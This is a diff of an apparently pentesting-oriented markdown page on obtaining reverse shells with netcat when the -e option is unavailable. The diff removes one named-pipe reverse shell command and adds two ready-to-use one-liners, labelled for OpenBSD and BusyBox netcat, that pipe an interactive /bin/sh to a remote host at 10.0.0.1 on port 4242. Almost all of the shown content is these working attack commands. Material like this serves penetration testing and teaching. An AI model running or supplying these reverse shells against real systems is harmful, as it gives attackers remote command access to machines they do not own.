@@ -98,10 +98,14 @@ One simple way to get a reverse shell on the target machine is using netcat. Fir
 
 Sometimes, -e is not supported. It simply doesn't exist.
 The solution is to redirect the stdin/stdout communication through a pipe.
-```bash 
-cd /tmp
-mknod mypipe p
-/bin/bash 0< /tmp/mypipe | nc $HOST_IP 8044 1> /tmp/mypipe
+###### Netcat OpenBsd
+```bash
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+```
+
+###### Netcat BusyBox
+```bash
+rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 ```
 
 ### Spawning a Stable Shell
